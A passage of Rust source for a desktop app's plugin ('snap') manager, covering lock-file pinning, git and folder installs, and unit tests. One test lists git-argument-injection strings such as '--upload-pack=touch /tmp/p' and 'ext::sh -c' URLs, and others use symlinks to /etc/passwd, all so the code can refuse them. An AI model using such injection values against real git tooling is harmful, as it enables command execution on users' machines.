  pub fn upsert(&mut self, entry: LockEntry) {
    self.snaps.retain(|e| !(e.id == entry.id && e.source == entry.source));
    self.snaps.push(entry);
    self.snaps.sort_by(|a, b| (a.id.as_str(), !is_repo(&a.source)).cmp(&(b.id.as_str(), !is_repo(&b.source))));
  }
}

/// `<root>/.kingu/snaps.lock` when `.kingu` is a real folder (not a symlink).
fn lock_path(root: &Path) -> Option<PathBuf> {
  let kingu = root.join(REPO_DIR[0]);
  let meta = std::fs::symlink_metadata(&kingu).ok()?;
  (!meta.file_type().is_symlink() && meta.is_dir()).then(|| kingu.join(LOCK_FILE))
}

/// The folder's lock, `None` when there is none (or it is a symlink, too big, corrupt or newer
/// than this version understands).
pub fn read_lock(root: &Path) -> Option<Lock> {
  let file = lock_path(root)?;
  let meta = std::fs::symlink_metadata(&file).ok()?;
  if !meta.is_file() || meta.len() > 4 * 1024 * 1024 {
    return None;
  }
  let lock: Lock = serde_json::from_slice(&std::fs::read(file).ok()?).ok()?;
  (lock.version >= 1 && lock.version <= LOCK_VERSION).then_some(lock)
}

fn save_lock(root: &Path, mut lock: Lock) -> Result<(), String> {
  let file = lock_path(root).ok_or_else(|| tr!(SnapMsg::KinguNotFolder))?;
  if std::fs::symlink_metadata(&file).is_ok_and(|m| !m.is_file()) {
    return Err(tr!(SnapMsg::NotPlainFile, path = file.display()));
  }
  lock.version = LOCK_VERSION;
  let text = serde_json::to_string_pretty(&lock).map_err(|e| e.to_string())?;
  write_atomic(&file, &(text + "\n")).map_err(|e| tr!(SnapMsg::WriteFailed, path = LOCK_FILE, detail = e))
}

/// Serializes read-modify-write of lock files.
static LOCK_FILE_LOCK: Mutex<()> = Mutex::new(());

/// The lock as it is, or an empty one to add to.
fn lock_or_new(root: &Path) -> Lock {
  read_lock(root).unwrap_or(Lock { version: LOCK_VERSION, snaps: Vec::new() })
}

/// Writes the lock for the valid repo snaps in `list` (team entries already there are kept);
/// returns how many repo snaps it pins.
pub fn write_lock(root: &Path, list: &[SnapInfo]) -> Result<usize, String> {
  repo_snaps_dir(root).ok_or_else(|| tr!(SnapMsg::NoRepoSnaps))?;
  lock_path(root).ok_or_else(|| tr!(SnapMsg::KinguNotFolder))?;
  let _guard = LOCK_FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
  let mut lock = lock_or_new(root);
  lock.snaps.retain(|e| e.source == LockSource::Team);
  let repo: Vec<&SnapInfo> = list.iter().filter(|s| s.source == Source::Repo && s.error.is_none()).collect();
  for s in &repo {
    lock.upsert(LockEntry::of(s, LockSource::Repo));
  }
  save_lock(root, lock)?;
  Ok(repo.len())
}

/// Re-approves repo snap `id` as it is now (`hash` is what the user was shown): its lock entry
/// is replaced and it is trusted, so the next listing has it locked and active again.
pub fn approve_locked(config_dir: &Path, root: &Path, list: &[SnapInfo], id: &str, hash: &str) -> Result<(), String> {
  let snap = list.iter().find(|s| s.source == Source::Repo && s.id == id).ok_or_else(|| tr!(SnapMsg::NotFoundHere, id))?;
  if let Some(e) = &snap.error {
    return Err(tr!(SnapMsg::TrustBroken, id, detail = e));
  }
  if snap.hash != hash {
    return Err(tr!(SnapMsg::TrustChanged, manifest = MANIFEST, id));
  }
  {
    let _guard = LOCK_FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let mut lock = lock_or_new(root);
    lock.upsert(LockEntry::of(snap, LockSource::Repo));
    save_lock(root, lock)?;
  }
  crate::snap::set_trust(config_dir, root, id, true, Some(hash))
}

/// Pins installed user snap `id` (installed from the team library) in the folder's lock.
pub fn pin_team(root: &Path, list: &[SnapInfo], id: &str) -> Result<(), String> {
  let snap = list.iter().find(|s| s.source == Source::User && s.id == id).ok_or_else(|| tr!(SnapMsg::NotInUserSnaps, id))?;
  if let Some(e) = &snap.error {
    return Err(tr!(SnapMsg::InstallBroken, id, detail = e));
  }
  if snap.origin.as_ref().and_then(|o| o.team.as_ref()).is_none() {
    return Err(tr!(SnapMsg::NotFromTeamLibrary, id));
  }
  lock_path(root).ok_or_else(|| tr!(SnapMsg::KinguNotFolder))?;
  let _guard = LOCK_FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
  let mut lock = lock_or_new(root);
  lock.upsert(LockEntry::of(snap, LockSource::Team));
  save_lock(root, lock)
}

/// `snap_lock_verify`: one row per lock entry, then one per repo snap the lock lacks.
#[derive(Serialize, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct LockReport {
  pub id: String,
  pub source: LockSource,
  /// `locked`, `changed`, `unlocked` (a repo snap the lock lacks) or `missing` (pinned, not here).
  pub status: String,
  pub locked_version: Option<String>,
  pub version: Option<String>,
  /// Files of the snap and repo scripts added, removed or changed since the lock was written
  /// (empty for a version-1 entry, which has no per-file hashes).
  pub files: Vec<String>,
  pub scripts: Vec<String>,
  pub locked_permissions: Option<Permissions>,
  pub permissions: Option<Permissions>,
}

fn changed_paths(locked: &BTreeMap<String, String>, now: &BTreeMap<String, String>) -> Vec<String> {
  let mut out: Vec<String> = locked.iter().filter(|(k, v)| now.get(*k) != Some(*v)).map(|(k, _)| k.clone()).collect();
  out.extend(now.keys().filter(|k| !locked.contains_key(*k)).cloned());
  out.sort();
  out
}

pub fn verify_lock(lock: &Lock, list: &[SnapInfo]) -> Vec<LockReport> {
  let mut out = Vec::new();
  for e in &lock.snaps {
    let want = if e.source == LockSource::Team { Source::User } else { Source::Repo };
    let report = |status: &str, snap: Option<&SnapInfo>, files: Vec<String>, scripts: Vec<String>| LockReport {
      id: e.id.clone(),
      source: e.source,
      status: status.into(),
      locked_version: Some(e.version.clone()),
      version: snap.map(|s| s.version.clone()),
      files,
      scripts,
      locked_permissions: e.permissions.clone(),
      permissions: snap.map(|s| s.permissions.clone()),
    };
    let Some(snap) = list.iter().find(|s| s.id == e.id && s.source == want) else {
      out.push(report("missing", None, Vec::new(), Vec::new()));
      continue;
    };
    if Lock::matches(e, snap) {
      out.push(report("locked", Some(snap), Vec::new(), Vec::new()));
    } else if e.files.is_empty() {
      out.push(report("changed", Some(snap), Vec::new(), Vec::new()));
    } else {
      let now = LockEntry::of(snap, e.source);
      out.push(report("changed", Some(snap), changed_paths(&e.files, &now.files), changed_paths(&e.scripts, &now.scripts)));
    }
  }
  for s in list.iter().filter(|s| s.source == Source::Repo && s.error.is_none() && lock.entry(&s.id).is_none()) {
    out.push(LockReport {
      id: s.id.clone(),
      source: LockSource::Repo,
      status: "unlocked".into(),
      locked_version: None,
      version: Some(s.version.clone()),
      files: Vec::new(),
      scripts: Vec::new(),
      locked_permissions: None,
      permissions: Some(s.permissions.clone()),
    });
  }
  out
}

// ---------------------------------------------------------------------------------------------
// Commands

pub(crate) fn staging_dir(app: &AppHandle) -> Result<PathBuf, String> {
  Ok(app.path().app_cache_dir().map_err(|e| e.to_string())?.join(STAGING_DIR))
}

pub(crate) fn user_dir(app: &AppHandle) -> Result<PathBuf, String> {
  Ok(config_dir(app)?.join(USER_DIR))
}

pub(crate) async fn blocking<T: Send + 'static>(f: impl FnOnce() -> Result<T, String> + Send + 'static) -> Result<T, String> {
  tauri::async_runtime::spawn_blocking(f).await.map_err(|e| e.to_string())?
}

#[tauri::command]
pub async fn snap_install_git(app: AppHandle, url: String) -> Result<Prepared, String> {
  blocking(move || prepare_git(&staging_dir(&app)?, &user_dir(&app)?, &url, CLONE_TIMEOUT)).await
}

#[tauri::command]
pub async fn snap_install_folder(app: AppHandle, path: String) -> Result<Prepared, String> {
  blocking(move || prepare_folder(&staging_dir(&app)?, &user_dir(&app)?, &path)).await
}

#[tauri::command]
pub async fn snap_update_prepare(app: AppHandle, id: String) -> Result<Prepared, String> {
  blocking(move || prepare_update(&staging_dir(&app)?, &user_dir(&app)?, &id, CLONE_TIMEOUT)).await
}

#[tauri::command]
pub async fn snap_install_commit(app: AppHandle, token: String, id: String, hash: String, replace: bool) -> Result<(), String> {
  blocking(move || {
    commit(&staging_dir(&app)?, &user_dir(&app)?, &token, &id, &hash, replace)?;
    log::info!("snap {id}: installed (replace = {replace})");
    Ok(())
  })
  .await
}

#[tauri::command]
pub fn snap_install_cancel(app: AppHandle, token: String) -> Result<(), String> {
  cancel(&staging_dir(&app)?, &token);
  Ok(())
}

#[tauri::command]
pub async fn snap_uninstall(app: AppHandle, id: String) -> Result<(), String> {
  blocking(move || {
    uninstall(&user_dir(&app)?, &id, |p| trash::delete(p).map_err(|e| tr!(SnapMsg::TrashFailed, detail = e)))?;
    log::info!("snap {id}: uninstalled");
    Ok(())
  })
  .await
}

/// Editor key of a user snap's manifest (read and saved through `snap_manifest_*`).
const USER_MANIFEST_KEY: &str = "snap://user/";

/// Creates a snap from the template; returns the editor key of its `snap.toml`.
#[tauri::command]
pub fn snap_new(app: AppHandle, ws: Workspace, id: String, name: String, location: String) -> Result<String, String> {
  match location.as_str() {
    "user" => {
      create(&user_dir(&app)?, &id, &name)?;
      Ok(format!("{USER_MANIFEST_KEY}{id}/{MANIFEST}"))
    }
    "repo" => {
      let root = ws.root().map_err(|_| tr!(SnapMsg::NoFolderOpen))?;
      create(&ensure_repo_snaps_dir(&root)?, &id, &name)?;
      Ok(format!("{}/{}/{id}/{MANIFEST}", REPO_DIR[0], REPO_DIR[1]))
    }
    _ => Err(tr!(SnapMsg::StoreInvalid)),
  }
}

/// The open folder and its snaps as listed now.
fn folder_snaps(app: &AppHandle, ws: &Workspace) -> Result<(PathBuf, PathBuf, Vec<SnapInfo>), String> {
  let root = ws.root().map_err(|_| tr!(SnapMsg::NoFolderOpen))?;
  let config = config_dir(app)?;
  let trust = TrustData::load(&config.join(crate::snap::TRUST_FILE));
  let list = crate::snap::discover(&config.join(USER_DIR), Some(&root), &trust);
  Ok((config, root, list))
}

#[tauri::command]
pub async fn snap_lock(app: AppHandle, ws: Workspace) -> Result<usize, String> {
  blocking(move || {
    let (_, root, list) = folder_snaps(&app, &ws)?;
    write_lock(&root, &list)
  })
  .await
}

/// Every lock entry against what the folder (and the user snaps) hold now.
#[tauri::command]
pub async fn snap_lock_verify(app: AppHandle, ws: Workspace) -> Result<Vec<LockReport>, String> {
  blocking(move || {
    let (_, root, list) = folder_snaps(&app, &ws)?;
    let lock = read_lock(&root).ok_or_else(|| tr!(SnapMsg::NoLockFile))?;
    Ok(verify_lock(&lock, &list))
  })
  .await
}

/// Re-approves a repo snap that differs from the lock: updates its entry and trusts it.
#[tauri::command]
pub async fn snap_lock_approve(app: AppHandle, ws: Workspace, id: String, hash: String) -> Result<(), String> {
  blocking(move || {
    let (config, root, list) = folder_snaps(&app, &ws)?;
    approve_locked(&config, &root, &list, &id, &hash)?;
    log::info!("snap {id}: re-approved and locked in {}", root.display());
    Ok(())
  })
  .await
}

/// Pins an installed team library snap in the folder's lock.
#[tauri::command]
pub async fn snap_lock_pin_team(app: AppHandle, ws: Workspace, id: String) -> Result<(), String> {
  blocking(move || {
    let (_, root, list) = folder_snaps(&app, &ws)?;
    pin_team(&root, &list, &id)
  })
  .await
}

#[tauri::command]
pub fn snap_reveal(app: AppHandle, ws: Workspace, id: String, source: String) -> Result<(), String> {
  // A broken snap's folder name need not be a valid id, but it is one plain name in the snaps dir.
  if id.is_empty() || id.starts_with('.') || id.contains(['/', '\\']) {
    return Err(tr!(SnapMsg::InvalidId, id));
  }
  let base = match source.as_str() {
    "user" => user_dir(&app)?,
    "repo" => repo_snaps_dir(&ws.root().map_err(|_| tr!(SnapMsg::NoFolderOpen))?).ok_or_else(|| tr!(SnapMsg::NoRepoSnaps))?,
    _ => return Err(tr!(SnapMsg::SourceInvalid)),
  };
  let path = base.join(&id);
  std::fs::symlink_metadata(&path).map_err(|_| tr!(SnapMsg::PathNotFound, path = path.display()))?;
  crate::fileops::reveal_path(&path)
}

/// `<user snaps>/<id>/snap.toml`, refusing symlinks.
fn user_manifest(app: &AppHandle, id: &str) -> Result<PathBuf, String> {
  if !is_snap_id(id) {
    return Err(tr!(SnapMsg::InvalidId, id));
  }
  let dir = user_dir(app)?.join(id);
  if !std::fs::symlink_metadata(&dir).is_ok_and(|m| m.is_dir()) {
    return Err(tr!(SnapMsg::NotFound, id));
  }
  let file = dir.join(MANIFEST);
  if std::fs::symlink_metadata(&file).is_ok_and(|m| !m.is_file()) {
    return Err(tr!(SnapMsg::ManifestNotPlainFile, manifest = MANIFEST));
  }
  Ok(file)
}

#[tauri::command]
pub fn snap_manifest_read(app: AppHandle, id: String) -> Result<String, String> {
  let file = user_manifest(&app, &id)?;
  if std::fs::metadata(&file).map(|m| m.len()).unwrap_or_default() > MAX_MANIFEST_BYTES {
    return Err(tr!(SnapMsg::ManifestTooBig, manifest = MANIFEST));
  }
  std::fs::read_to_string(&file).map_err(|e| tr!(SnapMsg::ManifestUnreadable, manifest = MANIFEST, detail = e))
}

#[tauri::command]
pub fn snap_manifest_write(app: AppHandle, id: String, content: String) -> Result<(), String> {
  if content.len() as u64 > MAX_MANIFEST_BYTES {
    return Err(tr!(SnapMsg::ManifestTooBig, manifest = MANIFEST));
  }
  write_atomic(&user_manifest(&app, &id)?, &content)
}

#[cfg(test)]
mod tests {
  use super::*;
  use std::process::Command;

  const T: Duration = Duration::from_secs(60);

  fn git(dir: &Path, args: &[&str]) {
    let out = Command::new("git")
      .arg("-C")
      .arg(dir)
      .args(["-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", "-c", "init.defaultBranch=main"])
      .args(args)
      .output()
      .unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
  }

  fn manifest(id: &str, version: &str, network: bool) -> String {
    format!("id = \"{id}\"\nname = \"{id} snap\"\nversion = \"{version}\"\n[permissions]\nnetwork = {network}\n[[tasks]]\nid = \"t\"\ntitle = \"T\"\ncommand = [\"echo\", \"hi\"]\n")
  }

  /// A bare repo at `<tmp>/remote.git` holding `files` on `main`; returns its path.
  fn remote(tmp: &Path, files: &[(&str, &str)]) -> PathBuf {
    let work = tmp.join("work");
    std::fs::create_dir_all(&work).unwrap();
    git(&work, &["init", "-q"]);
    commit_files(&work, files);
    let bare = tmp.join("remote.git");
    git(tmp, &["clone", "-q", "--bare", work.to_str().unwrap(), bare.to_str().unwrap()]);
    bare
  }

  fn commit_files(work: &Path, files: &[(&str, &str)]) {
    for (rel, text) in files {
      let p = work.join(rel);
      std::fs::create_dir_all(p.parent().unwrap()).unwrap();
      std::fs::write(p, text).unwrap();
    }
    git(work, &["add", "-A"]);
    git(work, &["commit", "-q", "-m", "c"]);
  }

  fn push(tmp: &Path) {
    git(&tmp.join("work"), &["push", "-q", tmp.join("remote.git").to_str().unwrap(), "HEAD:main"]);
  }

  struct Env {
    tmp: tempfile::TempDir,
    staging: PathBuf,
    user: PathBuf,
  }

  fn env() -> Env {
    let tmp = tempfile::tempdir().unwrap();
    let staging = tmp.path().join("staging");
    let user = tmp.path().join("config/snaps");
    Env { tmp, staging, user }
  }

  #[test]
  fn validates_git_sources() {
    assert_eq!(parse_git_source("https://github.com/a/b.git").unwrap(), GitSpec { url: "https://github.com/a/b.git".into(), git_ref: None });
    assert_eq!(parse_git_source("git@github.com:a/b.git#v1.2").unwrap().git_ref.as_deref(), Some("v1.2"));
    assert!(parse_git_source("ssh://git@host/x.git").is_ok());
    assert!(parse_git_source("/tmp/remote.git").is_ok());
    assert!(parse_git_source("file:///tmp/remote.git").is_ok());
    for bad in [
      "",
      "-uhttps://x",
      "--upload-pack=touch /tmp/p",
      "ext::sh -c touch% /tmp/pwned",
      "fd::3",
      "http://example.com/x.git",
      "git://example.com/x.git",
      "ssh://-oProxyCommand=x/y",
      "-oProxyCommand=x:y",
      "https://example.com/x.git#-b",
      "https://example.com/x.git#a..b",
      "relative/path",
      "https://exa mple.com/x",
    ] {
      assert!(parse_git_source(bad).is_err(), "{bad} should be refused");
    }
  }

  #[test]
  fn installs_from_git_with_the_manifest_at_the_root() {
    let e = env();
    let bare = remote(e.tmp.path(), &[("snap.toml", &manifest("go", "1.0.0", false)), ("README.md", "hi")]);
    let p = prepare_git(&e.staging, &e.user, bare.to_str().unwrap(), T).unwrap();
    assert_eq!(p.candidates.len(), 1);
    let c = &p.candidates[0];
    assert_eq!((c.rel.as_str(), c.snap.id.as_str(), c.snap.error.as_deref()), ("", "go", None));
    assert!(p.existing.is_empty());
    assert_eq!(p.origin.url.as_deref(), Some(bare.to_str().unwrap()));
    assert_eq!(p.origin.commit.as_ref().map(String::len), Some(40));
    // Nothing installed until commit.
    assert!(!e.user.join("go").exists());

    commit(&e.staging, &e.user, &p.token, "go", &c.snap.hash, false).unwrap();
    assert!(e.user.join("go/snap.toml").is_file() && e.user.join("go/README.md").is_file());
    assert!(!e.user.join("go/.git").exists());
    assert!(!e.staging.join(&p.token).exists(), "staging is cleaned up");
    let origin = read_origin(&e.user.join("go")).unwrap();
    assert_eq!(origin.url, p.origin.url);
    assert!(origin.installed_at > 0);

    // Listed with its origin; the origin record is not part of the hash.
    let list = crate::snap::discover(&e.user, None, &TrustData::default());
    assert_eq!(list.len(), 1);
    assert_eq!(list[0].hash, c.snap.hash);
    assert_eq!(list[0].origin.as_ref().and_then(|o| o.commit.clone()), p.origin.commit);

    // The same id again is refused unless it replaces the same origin.
    let again = prepare_git(&e.staging, &e.user, bare.to_str().unwrap(), T).unwrap();
    assert_eq!(again.existing.len(), 1);
    let h = again.candidates[0].snap.hash.clone();
    assert!(commit(&e.staging, &e.user, &again.token, "go", &h, false).unwrap_err().contains("already installed"));
  }

  #[test]
  fn origin_record_is_excluded_from_the_hash() {
    let e = env();
    let dir = e.user.join("x");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("snap.toml"), manifest("x", "1", false)).unwrap();
    let before = crate::snap::discover(&e.user, None, &TrustData::default())[0].hash.clone();
    std::fs::write(dir.join(ORIGIN_FILE), r#"{"url":"https://example.com/x.git","ref":null,"commit":"abc","path":null,"installed_at":5}"#).unwrap();
    let after = crate::snap::discover(&e.user, None, &TrustData::default());
    assert_eq!(after[0].hash, before);
    assert_eq!(after[0].origin.as_ref().unwrap().commit.as_deref(), Some("abc"));
  }

  #[test]
  fn installs_one_snap_of_a_monorepo_and_a_ref() {
    let e = env();
    let bare = remote(
      e.tmp.path(),
      &[("snaps/go/snap.toml", &manifest("go", "1", false)), ("snaps/rust/snap.toml", &manifest("rust", "2", true)), ("snaps/bad/snap.toml", "id = \"bad\"\n")],
    );
    let work = e.tmp.path().join("work");
    git(&work, &["tag", "v1"]);
    git(&work, &["push", "-q", bare.to_str().unwrap(), "v1"]);
    let p = prepare_git(&e.staging, &e.user, &format!("file://{}#v1", bare.display()), T).unwrap();
    let ids: Vec<_> = p.candidates.iter().map(|c| (c.rel.as_str(), c.snap.id.as_str(), c.snap.error.is_some())).collect();
    assert_eq!(ids, [("snaps/bad", "bad", true), ("snaps/go", "go", false), ("snaps/rust", "rust", false)]);
    assert_eq!(p.origin.git_ref.as_deref(), Some("v1"));
    let bad = p.candidates[0].snap.hash.clone();
    let rust = p.candidates[2].snap.hash.clone();
    assert!(commit(&e.staging, &e.user, &p.token, "bad", &bad, false).unwrap_err().contains("has an error"));
    // A refused commit removes the staging copy: start again.
    let p = prepare_git(&e.staging, &e.user, &format!("file://{}#v1", bare.display()), T).unwrap();
    assert!(commit(&e.staging, &e.user, &p.token, "rust", "not-the-hash", false).unwrap_err().contains("changed while waiting"));
    let p = prepare_git(&e.staging, &e.user, &format!("file://{}#v1", bare.display()), T).unwrap();
    commit(&e.staging, &e.user, &p.token, "rust", &rust, false).unwrap();
    assert!(e.user.join("rust/snap.toml").is_file() && !e.user.join("go").exists());
  }

  #[test]
  fn refuses_symlinks_oversize_and_missing_manifests() {
    let e = env();
    let src = e.tmp.path().join("src");
    std::fs::create_dir_all(&src).unwrap();
    std::fs::write(src.join("snap.toml"), manifest("s", "1", false)).unwrap();
    #[cfg(unix)]
    {
      std::os::unix::fs::symlink("/etc/passwd", src.join("link")).unwrap();
      let err = prepare_folder(&e.staging, &e.user, src.to_str().unwrap()).unwrap_err();
      assert!(err.contains("symlink"), "{err}");
      std::fs::remove_file(src.join("link")).unwrap();
      // A symlinked source folder is refused too.
      let link = e.tmp.path().join("linked");
      std::os::unix::fs::symlink(&src, &link).unwrap();
      assert!(prepare_folder(&e.staging, &e.user, link.to_str().unwrap()).unwrap_err().contains("symlink"));
    }
    std::fs::write(src.join("big.bin"), vec![0u8; MAX_BYTES as usize + 1]).unwrap();
    assert!(prepare_folder(&e.staging, &e.user, src.to_str().unwrap()).unwrap_err().contains("Too large"));
    std::fs::remove_file(src.join("big.bin")).unwrap();
    for i in 0..MAX_FILES {
      std::fs::write(src.join(format!("f{i}")), "").unwrap();
    }
    assert!(prepare_folder(&e.staging, &e.user, src.to_str().unwrap()).unwrap_err().contains("Too large"));

    let empty = e.tmp.path().join("empty");
    std::fs::create_dir_all(&empty).unwrap();
    assert!(prepare_folder(&e.staging, &e.user, empty.to_str().unwrap()).unwrap_err().contains("No snap.toml"));
    assert!(prepare_folder(&e.staging, &e.user, "relative").is_err());
    // Failed prepares leave no staging folders behind.
    assert_eq!(std::fs::read_dir(&e.staging).map(|r| r.count()).unwrap_or(0), 0);
  }

  #[cfg(unix)]
  #[test]
  fn refuses_a_cloned_repo_with_symlinks() {
    let e = env();
    let work = e.tmp.path().join("work");
    std::fs::create_dir_all(&work).unwrap();
    git(&work, &["init", "-q"]);
    std::fs::write(work.join("snap.toml"), manifest("s", "1", false)).unwrap();
    std::os::unix::fs::symlink("/etc/passwd", work.join("passwd")).unwrap();
    git(&work, &["add", "-A"]);
    git(&work, &["commit", "-q", "-m", "c"]);
    let err = prepare_git(&e.staging, &e.user, work.to_str().unwrap(), T).unwrap_err();
    assert!(err.contains("symlink"), "{err}");
  }

  #[test]
  fn installs_from_a_folder_and_reinstalls_from_the_same_folder() {
    let e = env();
    let src = e.tmp.path().join("my-snap");
    std::fs::create_dir_all(src.join(".git")).unwrap();
    std::fs::write(src.join(".git/HEAD"), "x").unwrap();
    std::fs::write(src.join("snap.toml"), manifest("mine", "1", false)).unwrap();
    std::fs::write(src.join(ORIGIN_FILE), r#"{"url":"https://evil.example/x.git"}"#).unwrap();
    let p = prepare_folder(&e.staging, &e.user, src.to_str().unwrap()).unwrap();
    commit(&e.staging, &e.user, &p.token, "mine", &p.candidates[0].snap.hash, false).unwrap();
    assert!(!e.user.join("mine/.git").exists());
    // The snap's own origin file is never copied: Kingu writes its own.
    let origin = read_origin(&e.user.join("mine")).unwrap();
    assert_eq!((origin.url, origin.path.as_deref()), (None, src.to_str()));

    std::fs::write(src.join("snap.toml"), manifest("mine", "2", false)).unwrap();
    let p = prepare_folder(&e.staging, &e.user, src.to_str().unwrap()).unwrap();
    commit(&e.staging, &e.user, &p.token, "mine", &p.candidates[0].snap.hash, true).unwrap();
    assert!(std::fs::read_to_string(e.user.join("mine/snap.toml")).unwrap().contains("version = \"2\""));
    // A git snap is not an update source for a folder install, so update refuses.
    assert!(prepare_update(&e.staging, &e.user, "mine", T).unwrap_err().contains("not installed from git"));
  }

  #[test]
  fn updates_from_the_origin_and_reports_new_permissions() {
    let e = env();
    let bare = remote(e.tmp.path(), &[("snap.toml", &manifest("go", "1.0.0", false))]);
    let p = prepare_git(&e.staging, &e.user, bare.to_str().unwrap(), T).unwrap();
    commit(&e.staging, &e.user, &p.token, "go", &p.candidates[0].snap.hash, false).unwrap();
    let first = read_origin(&e.user.join("go")).unwrap().commit;

    commit_files(&e.tmp.path().join("work"), &[("snap.toml", &manifest("go", "1.1.0", true))]);
    push(e.tmp.path());
    let u = prepare_update(&e.staging, &e.user, "go", T).unwrap();
    assert_eq!(u.existing.len(), 1);
    let (old, new) = (&u.existing[0], &u.candidates[0].snap);
    assert_eq!((old.version.as_str(), new.version.as_str()), ("1.0.0", "1.1.0"));
    assert!(!old.permissions.network && new.permissions.network, "the new network permission is visible to the confirm");
    // Still the old snap until committed.
    assert!(std::fs::read_to_string(e.user.join("go/snap.toml")).unwrap().contains("1.0.0"));
    commit(&e.staging, &e.user, &u.token, "go", &new.hash, true).unwrap();
    assert!(std::fs::read_to_string(e.user.join("go/snap.toml")).unwrap().contains("1.1.0"));
    let second = read_origin(&e.user.join("go")).unwrap().commit;
    assert_ne!(first, second);
    // No leftovers of the swap.
    let names: Vec<_> = std::fs::read_dir(&e.user).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
    assert_eq!(names, ["go"]);

    // A snap from another origin with the same id cannot replace it.
    let other = e.tmp.path().join("other");
    std::fs::create_dir_all(&other).unwrap();
    std::fs::write(other.join("snap.toml"), manifest("go", "9", false)).unwrap();
    let p = prepare_folder(&e.staging, &e.user, other.to_str().unwrap()).unwrap();
    assert!(commit(&e.staging, &e.user, &p.token, "go", &p.candidates[0].snap.hash, true).unwrap_err().contains("comes from somewhere else"));
  }

  fn head(work: &Path) -> String {
    String::from_utf8(Command::new("git").arg("-C").arg(work).args(["rev-parse", "HEAD"]).output().unwrap().stdout).unwrap().trim().to_string()
  }

  #[test]
  fn installs_a_team_pin_at_its_commit_not_the_tip() {
    let e = env();
    let v1 = manifest("go", "1.0.0", false);
    let bare = remote(e.tmp.path(), &[("snap.toml", &v1)]);
    let work = e.tmp.path().join("work");
    let first = head(&work);
    commit_files(&work, &[("snap.toml", &manifest("go", "2.0.0", true))]);
    push(e.tmp.path());
    let pin = Pin { id: "go".into(), url: format!("file://{}", bare.display()), git_ref: Some("main".into()), commit: first.clone(), sha256: crate::snap::sha256_hex(v1.as_bytes()) };

    let p = prepare_pinned(&e.staging, &e.user, &pin, T).unwrap();
    assert_eq!(p.candidates.len(), 1);
    let s = &p.candidates[0].snap;
    assert_eq!((s.version.as_str(), s.hash.as_str()), ("1.0.0", pin.sha256.as_str()));
    assert_eq!(p.origin.commit.as_deref(), Some(first.as_str()));
    assert_eq!(p.origin.git_ref.as_deref(), Some("main"));
    assert!(!e.user.join("go").exists(), "nothing installed before the confirm");
    commit(&e.staging, &e.user, &p.token, "go", &s.hash, false).unwrap();
    assert!(std::fs::read_to_string(e.user.join("go/snap.toml")).unwrap().contains("1.0.0"));
    assert!(!e.user.join("go/.git").exists());
    assert_eq!(read_origin(&e.user.join("go")).unwrap().commit.as_deref(), Some(first.as_str()));

    // Re-pinned to the tip: replaces the install from the same origin (a team update).
    let tip = head(&work);
    let pin2 = Pin { commit: tip.clone(), sha256: crate::snap::sha256_hex(manifest("go", "2.0.0", true).as_bytes()), ..pin.clone() };
    let p = prepare_pinned(&e.staging, &e.user, &pin2, T).unwrap();
    assert_eq!(p.existing.len(), 1);
    commit(&e.staging, &e.user, &p.token, "go", &p.candidates[0].snap.hash, true).unwrap();
    assert_eq!(read_origin(&e.user.join("go")).unwrap().commit.as_deref(), Some(tip.as_str()));
  }

  #[test]
  fn refuses_a_team_pin_whose_hash_or_commit_does_not_match() {
    let e = env();
    let bare = remote(e.tmp.path(), &[("snap.toml", &manifest("go", "1.0.0", false))]);
    let work = e.tmp.path().join("work");
    let pin = Pin { id: "go".into(), url: bare.display().to_string(), git_ref: None, commit: head(&work), sha256: "0".repeat(64) };

    let err = prepare_pinned(&e.staging, &e.user, &pin, T).unwrap_err();
    assert!(err.contains("does not match what the team approved"), "{err}");
    assert!(!e.user.join("go").exists());
    assert_eq!(std::fs::read_dir(&e.staging).map(|r| r.count()).unwrap_or(0), 0, "refused staging is removed");

    let real = crate::snap::sha256_hex(manifest("go", "1.0.0", false).as_bytes());
    let missing = Pin { commit: "1".repeat(40), sha256: real.clone(), ..pin.clone() };
    assert!(prepare_pinned(&e.staging, &e.user, &missing, T).is_err());
    let other_id = Pin { id: "rust".into(), sha256: real.clone(), ..pin.clone() };
    assert!(prepare_pinned(&e.staging, &e.user, &other_id, T).unwrap_err().contains("has no snap"));
    for bad in [Pin { commit: "abc".into(), ..pin.clone() }, Pin { sha256: "AB".repeat(32), ..pin.clone() }, Pin { url: "ext::sh -c x".into(), ..pin.clone() }, Pin { git_ref: Some("-x".into()), ..pin.clone() }] {
      assert!(prepare_pinned(&e.staging, &e.user, &bad, T).is_err(), "{bad:?}");
    }
    assert_eq!(std::fs::read_dir(&e.staging).map(|r| r.count()).unwrap_or(0), 0);
    // The right hash installs.
    let ok = Pin { sha256: real, ..pin };
    let p = prepare_pinned(&e.staging, &e.user, &ok, T).unwrap();
    commit(&e.staging, &e.user, &p.token, "go", &p.candidates[0].snap.hash, false).unwrap();
  }

  #[test]
  fn uninstall_hands_the_folder_to_trash() {
    let e = env();
    std::fs::create_dir_all(e.user.join("go")).unwrap();
    std::fs::write(e.user.join("go/snap.toml"), manifest("go", "1", false)).unwrap();
    let bin = e.tmp.path().join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    let fake_trash = |p: &Path| std::fs::rename(p, bin.join("go")).map_err(|e| e.to_string());
    uninstall(&e.user, "go", fake_trash).unwrap();
    assert!(!e.user.join("go").exists() && bin.join("go/snap.toml").is_file());
    assert!(uninstall(&e.user, "go", |_| Ok(())).unwrap_err().contains("not found"));
    assert!(uninstall(&e.user, "../x", |_| Ok(())).is_err());
  }

  #[test]
  fn new_snap_template_is_a_valid_snap() {
    let e = env();
    let file = create(&e.user, "hello", "Hello \"World\"").unwrap();
    let list = crate::snap::discover(&e.user, None, &TrustData::default());
    assert_eq!(list.len(), 1);
    assert_eq!(list[0].error, None);
    assert_eq!(list[0].name, "Hello \"World\"");
    assert_eq!(list[0].tasks.len(), 1);
    assert_eq!(list[0].settings.len(), 1);
    assert!(file.ends_with("hello/snap.toml"));
    assert!(create(&e.user, "hello", "again").unwrap_err().contains("already exists"));
    assert!(create(&e.user, "Bad", "x").is_err());
    assert!(create(&e.user, "ok", " ").is_err());

    let root = e.tmp.path().join("repo");
